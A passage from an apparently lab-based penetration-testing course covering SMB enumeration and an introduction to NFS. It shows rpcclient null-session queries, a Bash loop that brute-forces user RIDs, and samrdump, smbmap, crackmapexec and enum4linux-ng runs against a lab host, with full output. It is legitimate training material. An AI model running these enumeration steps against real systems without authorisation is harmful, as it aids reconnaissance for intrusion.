<span class="hljs-attr">        remark:</span> CheckIT
<span class="hljs-attr">        path:</span>   C:\mnt\notes\
<span class="hljs-attr">        password:</span>
<span class="hljs-attr">        type:</span>   <span class="hljs-number">0x0</span>
<span class="hljs-attr">        perms:</span>  <span class="hljs-number">0</span>
<span class="hljs-attr">        max_uses:</span>       <span class="hljs-bullet">-1</span>
<span class="hljs-attr">        num_uses:</span>       <span class="hljs-number">1</span>
<span class="hljs-attr">revision:</span> <span class="hljs-number">1</span>
<span class="hljs-attr">type:</span> <span class="hljs-number">0x8004</span>: SEC_DESC_DACL_PRESENT SEC_DESC_SELF_RELATIVE 
DACL
        ACL     Num ACEs:       <span class="hljs-number">1</span>       revision:       <span class="hljs-number">2</span>
<span class="hljs-bullet">        -</span>--
        ACE
<span class="hljs-attr">                type:</span> ACCESS ALLOWED (<span class="hljs-number">0</span>) flags: <span class="hljs-number">0x00</span> 
                Specific bits: <span class="hljs-number">0x1ff</span>
<span class="hljs-attr">                Permissions:</span> <span class="hljs-number">0x101f01ff</span>: Generic all access SYNCHRONIZE_ACCESS WRITE_OWNER_ACCESS WRITE_DAC_ACCESS READ_CONTROL_ACCESS DELETE_ACCESS 
<span class="hljs-attr">                SID:</span> S<span class="hljs-bullet">-1</span><span class="hljs-bullet">-1</span><span class="hljs-bullet">-0</span>
</code></pre>
<p>These examples show us what information can be leaked to anonymous users. Once an <code>anonymous</code> user has access to a network service, it only takes one mistake to give them too many permissions or too much visibility to put the entire network at significant risk.</p>
<p>Most importantly, anonymous access to such services can also lead to the discovery of other users, who can be attacked with brute-forcing in the most aggressive case. Humans are more error-prone than properly configured computer processes, and the lack of security awareness and laziness often leads to weak passwords that can be easily cracked. Let us see how we can enumerate users using the <code>rpcclient</code>.</p>
<p><strong>Rpcclient - User Enumeration</strong></p>
<pre><code class="lang-shell-session">rpcclient $&gt; enumdomusers
<span class="hljs-symbol">
user:</span>[mrb3n] <span class="hljs-string">rid:</span>[<span class="hljs-number">0x3e8</span>]
<span class="hljs-string">user:</span>[cry0l1t3] <span class="hljs-string">rid:</span>[<span class="hljs-number">0x3e9</span>]


rpcclient $&gt; queryuser <span class="hljs-number">0x3e9</span>

        User <span class="hljs-string">Name   :</span>   cry0l1t3
        Full <span class="hljs-string">Name   :</span>   cry0l1t3
        Home <span class="hljs-string">Drive  :</span>   \\devsmb\cry0l1t3
        Dir <span class="hljs-string">Drive   :</span>
        Profile <span class="hljs-string">Path:</span>   \\devsmb\cry0l1t3\profile
        Logon <span class="hljs-string">Script:</span>
        <span class="hljs-string">Description :</span>
<span class="hljs-symbol">        Workstations:</span>
        <span class="hljs-string">Comment     :</span>
        Remote <span class="hljs-string">Dial :</span>
        Logon <span class="hljs-string">Time               :</span>      Do, <span class="hljs-number">01</span> Jan <span class="hljs-number">1970</span> <span class="hljs-number">01</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> CET
        Logoff <span class="hljs-string">Time              :</span>      Mi, <span class="hljs-number">06</span> Feb <span class="hljs-number">2036</span> <span class="hljs-number">16</span>:<span class="hljs-number">06</span>:<span class="hljs-number">39</span> CET
        Kickoff <span class="hljs-string">Time             :</span>      Mi, <span class="hljs-number">06</span> Feb <span class="hljs-number">2036</span> <span class="hljs-number">16</span>:<span class="hljs-number">06</span>:<span class="hljs-number">39</span> CET
        Password last set <span class="hljs-string">Time   :</span>      Mi, <span class="hljs-number">22</span> Sep <span class="hljs-number">2021</span> <span class="hljs-number">17</span>:<span class="hljs-number">50</span>:<span class="hljs-number">56</span> CEST
        Password can change <span class="hljs-string">Time :</span>      Mi, <span class="hljs-number">22</span> Sep <span class="hljs-number">2021</span> <span class="hljs-number">17</span>:<span class="hljs-number">50</span>:<span class="hljs-number">56</span> CEST
        Password must change <span class="hljs-string">Time:</span>      Do, <span class="hljs-number">14</span> Sep <span class="hljs-number">30828</span> <span class="hljs-number">04</span>:<span class="hljs-number">48</span>:<span class="hljs-number">05</span> CEST
        unknown_2[<span class="hljs-number">0.</span><span class="hljs-number">.31</span>]...
        <span class="hljs-string">user_rid :</span>      <span class="hljs-number">0x3e9</span>
<span class="hljs-symbol">        group_rid:</span>      <span class="hljs-number">0x201</span>
        <span class="hljs-string">acb_info :</span>      <span class="hljs-number">0x00000014</span>
<span class="hljs-symbol">        fields_present:</span> <span class="hljs-number">0x00ffffff</span>
<span class="hljs-symbol">        logon_divs:</span>     <span class="hljs-number">168</span>
<span class="hljs-symbol">        bad_password_count:</span>     <span class="hljs-number">0x00000000</span>
<span class="hljs-symbol">        logon_count:</span>    <span class="hljs-number">0x00000000</span>
        padding1[<span class="hljs-number">0.</span><span class="hljs-number">.7</span>]...
        logon_hrs[<span class="hljs-number">0.</span><span class="hljs-number">.21</span>]...


rpcclient $&gt; queryuser <span class="hljs-number">0x3e8</span>

        User <span class="hljs-string">Name   :</span>   mrb3n
        Full <span class="hljs-string">Name   :</span>
        Home <span class="hljs-string">Drive  :</span>   \\devsmb\mrb3n
        Dir <span class="hljs-string">Drive   :</span>
        Profile <span class="hljs-string">Path:</span>   \\devsmb\mrb3n\profile
        Logon <span class="hljs-string">Script:</span>
        <span class="hljs-string">Description :</span>
<span class="hljs-symbol">        Workstations:</span>
        <span class="hljs-string">Comment     :</span>
        Remote <span class="hljs-string">Dial :</span>
        Logon <span class="hljs-string">Time               :</span>      Do, <span class="hljs-number">01</span> Jan <span class="hljs-number">1970</span> <span class="hljs-number">01</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> CET
        Logoff <span class="hljs-string">Time              :</span>      Mi, <span class="hljs-number">06</span> Feb <span class="hljs-number">2036</span> <span class="hljs-number">16</span>:<span class="hljs-number">06</span>:<span class="hljs-number">39</span> CET
        Kickoff <span class="hljs-string">Time             :</span>      Mi, <span class="hljs-number">06</span> Feb <span class="hljs-number">2036</span> <span class="hljs-number">16</span>:<span class="hljs-number">06</span>:<span class="hljs-number">39</span> CET
        Password last set <span class="hljs-string">Time   :</span>      Mi, <span class="hljs-number">22</span> Sep <span class="hljs-number">2021</span> <span class="hljs-number">17</span>:<span class="hljs-number">47</span>:<span class="hljs-number">59</span> CEST
        Password can change <span class="hljs-string">Time :</span>      Mi, <span class="hljs-number">22</span> Sep <span class="hljs-number">2021</span> <span class="hljs-number">17</span>:<span class="hljs-number">47</span>:<span class="hljs-number">59</span> CEST
        Password must change <span class="hljs-string">Time:</span>      Do, <span class="hljs-number">14</span> Sep <span class="hljs-number">30828</span> <span class="hljs-number">04</span>:<span class="hljs-number">48</span>:<span class="hljs-number">05</span> CEST
        unknown_2[<span class="hljs-number">0.</span><span class="hljs-number">.31</span>]...
        <span class="hljs-string">user_rid :</span>      <span class="hljs-number">0x3e8</span>
<span class="hljs-symbol">        group_rid:</span>      <span class="hljs-number">0x201</span>
        <span class="hljs-string">acb_info :</span>      <span class="hljs-number">0x00000010</span>
<span class="hljs-symbol">        fields_present:</span> <span class="hljs-number">0x00ffffff</span>
<span class="hljs-symbol">        logon_divs:</span>     <span class="hljs-number">168</span>
<span class="hljs-symbol">        bad_password_count:</span>     <span class="hljs-number">0x00000000</span>
<span class="hljs-symbol">        logon_count:</span>    <span class="hljs-number">0x00000000</span>
        padding1[<span class="hljs-number">0.</span><span class="hljs-number">.7</span>]...
        logon_hrs[<span class="hljs-number">0.</span><span class="hljs-number">.21</span>]...
</code></pre>
<p>We can then use the results to identify the group&#39;s RID, which we can then use to retrieve information from the entire group.</p>
<p><strong>Rpcclient - Group Information</strong></p>
<pre><code class="lang-shell-session">rpcclient $&gt; querygroup <span class="hljs-number">0</span>x201

        <span class="hljs-keyword">Group</span> <span class="hljs-title">Name</span>:     None
        Description:    Ordinary Users
        <span class="hljs-keyword">Group</span> <span class="hljs-title">Attribute</span>:<span class="hljs-number">7</span>
        Num Members:<span class="hljs-number">2</span>
</code></pre>
<p>However, it can also happen that not all commands are available to us, and we have certain restrictions based on the user. However, the query <code>queryuser &lt;RID&gt;</code> is mostly allowed based on the RID. So we can use the rpcclient to brute force the RIDs to get information. Because we may not know who has been assigned which RID, we know that we will get information about it as soon as we query an assigned RID. There are several ways and tools we can use for this. To stay with the tool, we can create a <code>For-loop</code> using <code>Bash</code> where we send a command to the service using rpcclient and filter out the results.</p>
<p><strong>Brute Forcing User RIDs</strong></p>
<pre><code class="lang-shell-session">[!bash!]$ for i <span class="hljs-keyword">in</span> $(seq <span class="hljs-number">500</span> <span class="hljs-number">1100</span>);do rpcclient -N -U <span class="hljs-string">""</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">14.128</span> -c <span class="hljs-string">"queryuser 0x$(printf '%x\n' $i)"</span> | grep <span class="hljs-string">"User Name\|user_rid\|group_rid"</span> &amp;&amp; echo <span class="hljs-string">""</span>;done

        <span class="hljs-keyword">User</span> <span class="hljs-title">Name</span>   :   sambauser
        user_rid :      <span class="hljs-number">0</span>x1f5
        group_rid:      <span class="hljs-number">0</span>x201

        <span class="hljs-keyword">User</span> <span class="hljs-title">Name</span>   :   mrb3n
        user_rid :      <span class="hljs-number">0</span>x3e8
        group_rid:      <span class="hljs-number">0</span>x201

        <span class="hljs-keyword">User</span> <span class="hljs-title">Name</span>   :   cry0l1t3
        user_rid :      <span class="hljs-number">0</span>x3e9
        group_rid:      <span class="hljs-number">0</span>x201
</code></pre>
<p>An alternative to this would be a Python script from <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a> called <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/samrdump.py">samrdump.py</a>.</p>
<p><strong>Impacket - Samrdump.py</strong></p>
<pre><code class="lang-shell-session">[<span class="hljs-name">!bash!</span>]$ samrdump.py <span class="hljs-number">10.129</span>.14.128

Impacket v0.9.22 - Copyright <span class="hljs-number">2020</span> SecureAuth Corporation

[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Retrieving endpoint list from <span class="hljs-number">10.129</span>.14.128
Found domain(<span class="hljs-name">s</span>):
 . DEVSMB
 . Builtin
[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Looking up users in domain DEVSMB
Found user: mrb3n, uid = <span class="hljs-number">1000</span>
Found user: cry0l1t3, uid = <span class="hljs-number">1001</span>
mrb3n (<span class="hljs-name">1000</span>)/FullName: 
mrb3n (<span class="hljs-name">1000</span>)/UserComment: 
mrb3n (<span class="hljs-name">1000</span>)/PrimaryGroupId: <span class="hljs-number">513</span>
mrb3n (<span class="hljs-name">1000</span>)/BadPasswordCount: <span class="hljs-number">0</span>
mrb3n (<span class="hljs-name">1000</span>)/LogonCount: <span class="hljs-number">0</span>
mrb3n (<span class="hljs-name">1000</span>)/PasswordLastSet: <span class="hljs-number">2021</span><span class="hljs-number">-09</span><span class="hljs-number">-22</span> <span class="hljs-number">17</span>:47:59
mrb3n (<span class="hljs-name">1000</span>)/PasswordDoesNotExpire: False
mrb3n (<span class="hljs-name">1000</span>)/AccountIsDisabled: False
mrb3n (<span class="hljs-name">1000</span>)/ScriptPath: 
cry0l1t3 (<span class="hljs-name">1001</span>)/FullName: cry0l1t3
cry0l1t3 (<span class="hljs-name">1001</span>)/UserComment: 
cry0l1t3 (<span class="hljs-name">1001</span>)/PrimaryGroupId: <span class="hljs-number">513</span>
cry0l1t3 (<span class="hljs-name">1001</span>)/BadPasswordCount: <span class="hljs-number">0</span>
cry0l1t3 (<span class="hljs-name">1001</span>)/LogonCount: <span class="hljs-number">0</span>
cry0l1t3 (<span class="hljs-name">1001</span>)/PasswordLastSet: <span class="hljs-number">2021</span><span class="hljs-number">-09</span><span class="hljs-number">-22</span> <span class="hljs-number">17</span>:50:56
cry0l1t3 (<span class="hljs-name">1001</span>)/PasswordDoesNotExpire: False
cry0l1t3 (<span class="hljs-name">1001</span>)/AccountIsDisabled: False
cry0l1t3 (<span class="hljs-name">1001</span>)/ScriptPath: 
[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Received <span class="hljs-number">2</span> entries.
</code></pre>
<p>The information we have already obtained with <code>rpcclient</code> can also be obtained using other tools. For example, the <a href="https://github.com/ShawnDEvans/smbmap">SMBMap</a> and <a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a> tools are also widely used and helpful for the enumeration of SMB services.</p>
<p><strong>SMBmap</strong></p>
<pre><code class="lang-shell-session">[!bash!]$ smbmap -H 10.129.14.128

[+] Finding open SMB ports....
[+] User SMB session established on 10.129.14.128...
[+] IP: 10.129.14.128:445       Name: 10.129.14.128                                     
        Disk                                                    Permissions     <span class="hljs-keyword">Comment</span>
        <span class="hljs-comment">----                                                    -----------     -------</span>
        print$                                                  <span class="hljs-keyword">NO</span> <span class="hljs-keyword">ACCESS</span>       Printer Drivers
        home                                                    <span class="hljs-keyword">NO</span> <span class="hljs-keyword">ACCESS</span>       INFREIGHT Samba
        dev                                                     <span class="hljs-keyword">NO</span> <span class="hljs-keyword">ACCESS</span>       DEVenv
        notes                                                   <span class="hljs-keyword">NO</span> <span class="hljs-keyword">ACCESS</span>       CheckIT
        IPC$                                                    <span class="hljs-keyword">NO</span> <span class="hljs-keyword">ACCESS</span>       IPC Service (DEVSM)
</code></pre>
<p><strong>CrackMapExec</strong></p>
<pre><code class="lang-shell-session">[<span class="hljs-name">!bash!</span>]$ crackmapexec smb <span class="hljs-number">10.129</span>.14.128 --shares -u '' -p ''

SMB         <span class="hljs-number">10.129</span>.14.128   <span class="hljs-number">445</span>    DEVSMB           [<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Windows <span class="hljs-number">6.1</span> Build <span class="hljs-number">0</span> (<span class="hljs-name">name:DEVSMB</span>) (<span class="hljs-name">domain:</span>) (<span class="hljs-name">signing:False</span>) (<span class="hljs-name">SMBv1:False</span>)
SMB         <span class="hljs-number">10.129</span>.14.128   <span class="hljs-number">445</span>    DEVSMB           [<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] \: 
SMB         <span class="hljs-number">10.129</span>.14.128   <span class="hljs-number">445</span>    DEVSMB           [<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] Enumerated shares
SMB         <span class="hljs-number">10.129</span>.14.128   <span class="hljs-number">445</span>    DEVSMB           Share           Permissions     Remark
SMB         <span class="hljs-number">10.129</span>.14.128   <span class="hljs-number">445</span>    DEVSMB           -----           -----------     ------
SMB         <span class="hljs-number">10.129</span>.14.128   <span class="hljs-number">445</span>    DEVSMB           print$                          Printer Drivers
SMB         <span class="hljs-number">10.129</span>.14.128   <span class="hljs-number">445</span>    DEVSMB           home                            INFREIGHT Samba
SMB         <span class="hljs-number">10.129</span>.14.128   <span class="hljs-number">445</span>    DEVSMB           dev                             DEVenv
SMB         <span class="hljs-number">10.129</span>.14.128   <span class="hljs-number">445</span>    DEVSMB           notes           READ,WRITE      CheckIT
SMB         <span class="hljs-number">10.129</span>.14.128   <span class="hljs-number">445</span>    DEVSMB           IPC$                            IPC Service (<span class="hljs-name">DEVSM</span>)
</code></pre>
<p>Another tool worth mentioning is the so-called <a href="https://github.com/cddmp/enum4linux-ng">enum4linux-ng</a>, which is based on an older tool, enum4linux. This tool automates many of the queries, but not all, and can return a large amount of information.</p>
<p><strong>Enum4Linux-ng - Installation</strong></p>
<pre><code class="lang-shell-session">[!bash!]$ git clone https://github.com/cddmp/enum4linux-ng.git
[!bash!]$ cd enum4linux-ng
[!bash!]$ pip3 install -r requirements.txt
</code></pre>
<p><strong>Enum4Linux-ng - Enumeration</strong></p>
<pre><code class="lang-shell-session">[<span class="hljs-name">!bash!</span>]$ ./enum4linux-ng.py <span class="hljs-number">10.129</span>.14.128 -A

ENUM4LINUX - next generation

 ==========================
|    Target Information    |
 ==========================
[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Target ........... <span class="hljs-number">10.129</span>.14.128
[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Username ......... ''
[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Random Username .. <span class="hljs-symbol">'juzgtcsu</span>'
[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Password ......... ''
[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Timeout .......... <span class="hljs-number">5</span> second(<span class="hljs-name">s</span>)

 =====================================
|    Service Scan on <span class="hljs-number">10.129</span>.14.128    |
 =====================================
[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Checking LDAP
[<span class="hljs-name"><span class="hljs-builtin-name">-</span></span>] Could not connect to LDAP on <span class="hljs-number">389</span>/tcp: connection refused
[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Checking LDAPS
[<span class="hljs-name"><span class="hljs-builtin-name">-</span></span>] Could not connect to LDAPS on <span class="hljs-number">636</span>/tcp: connection refused
[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Checking SMB
[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] SMB is accessible on <span class="hljs-number">445</span>/tcp
[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Checking SMB over NetBIOS
[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] SMB over NetBIOS is accessible on <span class="hljs-number">139</span>/tcp

 =====================================================
|    NetBIOS Names and Workgroup for <span class="hljs-number">10.129</span>.14.128    |
 =====================================================
[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] Got domain/workgroup name: DEVOPS
[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] Full NetBIOS names information:
- DEVSMB          &lt;00&gt; -         H &lt;ACTIVE&gt;  Workstation Service
- DEVSMB          &lt;03&gt; -         H &lt;ACTIVE&gt;  Messenger Service
- DEVSMB          &lt;20&gt; -         H &lt;ACTIVE&gt;  File Server Service
- ..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; H &lt;ACTIVE&gt;  Master Browser
- DEVOPS          &lt;00&gt; - &lt;GROUP&gt; H &lt;ACTIVE&gt;  Domain/Workgroup Name
- DEVOPS          &lt;1d&gt; -         H &lt;ACTIVE&gt;  Master Browser
- DEVOPS          &lt;1e&gt; - &lt;GROUP&gt; H &lt;ACTIVE&gt;  Browser Service Elections
- MAC Address = <span class="hljs-number">00</span><span class="hljs-number">-00</span><span class="hljs-number">-00</span><span class="hljs-number">-00</span><span class="hljs-number">-00</span><span class="hljs-number">-00</span>

 ==========================================
|    SMB Dialect Check on <span class="hljs-number">10.129</span>.14.128    |
 ==========================================
[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Trying on <span class="hljs-number">445</span>/tcp
[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] Supported dialects and settings:
SMB <span class="hljs-number">1.0</span>: false
SMB <span class="hljs-number">2.02</span>: true
SMB <span class="hljs-number">2.1</span>: true
SMB <span class="hljs-number">3.0</span>: true
SMB1 only: false
Preferred dialect: SMB <span class="hljs-number">3.0</span>
SMB signing required: false

 ==========================================
|    RPC Session Check on <span class="hljs-number">10.129</span>.14.128    |
 ==========================================
[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Check for null session
[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] Server allows session using username '', password ''
[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Check for random user session
[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] Server allows session using username <span class="hljs-symbol">'juzgtcsu</span>', password ''
[<span class="hljs-name">H</span>] Rerunning enumeration with user <span class="hljs-symbol">'juzgtcsu</span>' might give more results

 ====================================================
|    Domain Information via RPC for <span class="hljs-number">10.129</span>.14.128    |
 ====================================================
[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] Domain: DEVOPS
[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] SID: NULL SID
[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] Host is part of a workgroup (<span class="hljs-name"><span class="hljs-builtin-name">not</span></span> a domain)

 ============================================================
|    Domain Information via SMB session for <span class="hljs-number">10.129</span>.14.128    |
 ============================================================
[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Enumerating via unauthenticated SMB session on <span class="hljs-number">445</span>/tcp
[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] Found domain information via SMB
NetBIOS computer name: DEVSMB
NetBIOS domain name: ''
DNS domain: ''
FQDN: htb

 ================================================
|    OS Information via RPC for <span class="hljs-number">10.129</span>.14.128    |
 ================================================
[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Enumerating via unauthenticated SMB session on <span class="hljs-number">445</span>/tcp
[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] Found OS information via SMB
[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Enumerating via <span class="hljs-symbol">'srvinfo</span>'
[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] Found OS information via <span class="hljs-symbol">'srvinfo</span>'
[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] After merging OS information we have the following result:
OS: Windows <span class="hljs-number">7</span>, Windows Server <span class="hljs-number">2008</span> R2
OS version: <span class="hljs-symbol">'6.1</span>'
OS release: ''
OS build: <span class="hljs-symbol">'0</span>'
Native OS: not supported
Native LAN manager: not supported
Platform id: <span class="hljs-symbol">'500</span>'
Server type: <span class="hljs-symbol">'0x809a03</span>'
Server type string: Wk Sv PrQ Unx NT SNT DEVSM

 ======================================
|    Users via RPC on <span class="hljs-number">10.129</span>.14.128    |
 ======================================
[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Enumerating users via <span class="hljs-symbol">'querydispinfo</span>'
[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] Found <span class="hljs-number">2</span> users via <span class="hljs-symbol">'querydispinfo</span>'
[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Enumerating users via <span class="hljs-symbol">'enumdomusers</span>'
[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] Found <span class="hljs-number">2</span> users via <span class="hljs-symbol">'enumdomusers</span>'
[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] After merging user results we have <span class="hljs-number">2</span> users total:
<span class="hljs-symbol">'1000</span><span class="hljs-symbol">':</span>
  username: mrb3n
  name: ''
  acb: <span class="hljs-symbol">'0x00000010</span>'
  description: ''
<span class="hljs-symbol">'1001</span><span class="hljs-symbol">':</span>
  username: cry0l1t3
  name: cry0l1t3
  acb: <span class="hljs-symbol">'0x00000014</span>'
  description: ''

 =======================================
|    Groups via RPC on <span class="hljs-number">10.129</span>.14.128    |
 =======================================
[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Enumerating local groups
[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] Found <span class="hljs-number">0</span> group(<span class="hljs-name">s</span>) via <span class="hljs-symbol">'enumalsgroups</span> domain'
[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Enumerating builtin groups
[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] Found <span class="hljs-number">0</span> group(<span class="hljs-name">s</span>) via <span class="hljs-symbol">'enumalsgroups</span> builtin'
[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Enumerating domain groups
[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] Found <span class="hljs-number">0</span> group(<span class="hljs-name">s</span>) via <span class="hljs-symbol">'enumdomgroups</span>'

 =======================================
|    Shares via RPC on <span class="hljs-number">10.129</span>.14.128    |
 =======================================
[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Enumerating shares
[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] Found <span class="hljs-number">5</span> share(<span class="hljs-name">s</span>):
IPC$:
  comment: IPC Service (<span class="hljs-name">DEVSM</span>)
  type: IPC
dev:
  comment: DEVenv
  type: Disk
home:
  comment: INFREIGHT Samba
  type: Disk
notes:
  comment: CheckIT
  type: Disk
print$:
  comment: Printer Drivers
  type: Disk
[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Testing share IPC$
[<span class="hljs-name"><span class="hljs-builtin-name">-</span></span>] Could not check share: STATUS_OBJECT_NAME_NOT_FOUND
[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Testing share dev
[<span class="hljs-name"><span class="hljs-builtin-name">-</span></span>] Share doesn<span class="hljs-symbol">'t</span> exist
[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Testing share home
[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] Mapping: OK, Listing: OK
[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Testing share notes
[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] Mapping: OK, Listing: OK
[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Testing share print$
[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] Mapping: DENIED, Listing: N/A

 ==========================================
|    Policies via RPC for <span class="hljs-number">10.129</span>.14.128    |
 ==========================================
[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Trying port <span class="hljs-number">445</span>/tcp
[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] Found policy:
domain_password_information:
  pw_history_length: None
  min_pw_length: <span class="hljs-number">5</span>
  min_pw_age: none
  max_pw_age: <span class="hljs-number">49710</span> days <span class="hljs-number">6</span> hours <span class="hljs-number">21</span> minutes
  pw_properties:
  - DOMAIN_PASSWORD_COMPLEX: false
  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false
  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false
  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false
  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false
  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false
domain_lockout_information:
  lockout_observation_window: <span class="hljs-number">30</span> minutes
  lockout_duration: <span class="hljs-number">30</span> minutes
  lockout_threshold: None
domain_logoff_information:
  force_logoff_time: <span class="hljs-number">49710</span> days <span class="hljs-number">6</span> hours <span class="hljs-number">21</span> minutes

 ==========================================
|    Printers via RPC for <span class="hljs-number">10.129</span>.14.128    |
 ==========================================
[<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] No printers returned (<span class="hljs-name">this</span> is not an error)

Completed after <span class="hljs-number">0.61</span> seconds
</code></pre>
<p>We need to use more than two tools for enumeration. Because it can happen that due to the programming of the tools, we get different information that we have to check manually. Therefore, we should never rely only on automated tools where we do not know precisely how they were written.</p>
<h2 id="nfs">NFS</h2>
<hr>
<p><code>Network File System</code> (<code>NFS</code>) is a network file system developed by Sun Microsystems and has the same purpose as SMB. Its purpose is to access file systems over a network as if they were local. However, it uses an entirely different protocol. <a href="https://en.wikipedia.org/wiki/Network\_File\_System">NFS</a> is used between Linux and Unix systems. This means that NFS clients cannot communicate directly with SMB servers. NFS is an Internet standard that governs the procedures in a distributed file system. While NFS protocol version 3.0 (<code>NFSv3</code>), which has been in use for many years, authenticates the client computer, this changes with <code>NFSv4</code>. Here, as with the Windows SMB protocol, the user must authenticate.</p>
<table>
<thead>
<tr>
<th><strong>Version</strong></th>
<th><strong>Features</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>NFSv2</code></td>
<td>It is older but is supported by many systems and was initially operated entirely over UDP.</td>
</tr>
<tr>
<td><code>NFSv3</code></td>
<td>It has more features, including variable file size and better error reporting, but is not fully compatible with NFSv2 clients.</td>
</tr>
<tr>
<td><code>NFSv4</code></td>
<td>It includes Kerberos, works through firewalls and on the Internet, no longer requires portmappers, supports ACLs, applies state-based operations, and provides performance improvements and high security. It is also the first version to have a stateful protocol.</td>
</tr>
</tbody>
</table>
<p>NFS version 4.1 (<a href="https://datatracker.ietf.org/doc/html/rfc8881">RFC 8881</a>) aims to provide protocol support to leverage cluster server deployments, including the ability to provide scalable parallel access to files distributed across multiple servers (pNFS extension). In addition, NFSv4.1 includes a session trunking mechanism, also known as NFS multipathing. A significant advantage of NFSv4 over its predecessors is that only one UDP or TCP port <code>2049</code> is used to run the service, which simplifies the use of the protocol across firewalls.</p>
<p>NFS is based on the <a href="https://en.wikipedia.org/wiki/Sun\_RPC">Open Network Computing Remote Procedure Call</a> (<code>ONC-RPC</code>/<code>SUN-RPC</code>) protocol exposed on <code>TCP</code> and <code>UDP</code> ports <code>111</code>, which uses <a href="https://en.wikipedia.org/wiki/External\_Data\_Representation">External Data Representation</a> (<code>XDR</code>) for the system-independent exchange of data. The NFS protocol has <code>no</code> mechanism for <code>authentication</code> or <code>authorization</code>. Instead, authentication is completely shifted to the RPC protocol&#39;s options. The authorization is derived from the available file system information. In this process, the server is responsible for translating the client&#39;s user information into the file system&#39;s format and converting the corresponding authorization details into the required UNIX syntax as accurately as possible.</p>
<p>The most common authentication is via UNIX <code>UID</code>/<code>GID</code> and <code>group memberships</code>, which is why this syntax is most likely to be applied to the NFS protocol. One problem is that the client and server do not necessarily have to have the same mappings of UID/GID to users and groups, and the server does not need to do anything further. No further checks can be made on the part of the server. This is why NFS should only be used with this authentication method in trusted networks.</p>
<hr>
<h3 id="default-configuration">Default Configuration</h3>
<p>NFS is not difficult to configure because there are not as many options as FTP or SMB have. The <code>/etc/exports</code> file contains a table of physical filesystems on an NFS server accessible by the clients. The <a href="http://manpages.ubuntu.com/manpages/trusty/man5/exports.5.html">NFS Exports Table</a> shows which options it accepts and thus indicates which options are available to us.</p>
<p><strong>Exports File</strong></p>
<p>NFS</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ cat /etc/exports 

<span class="hljs-meta"># /etc/exports: the access control list for filesystems which may be exported</span>
<span class="hljs-meta">#               to NFS clients.  See exports(5).</span>
<span class="hljs-meta">#</span>
<span class="hljs-meta"># Example for NFSv2 and NFSv3:</span>
<span class="hljs-meta"># /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)</span>
<span class="hljs-meta">#</span>
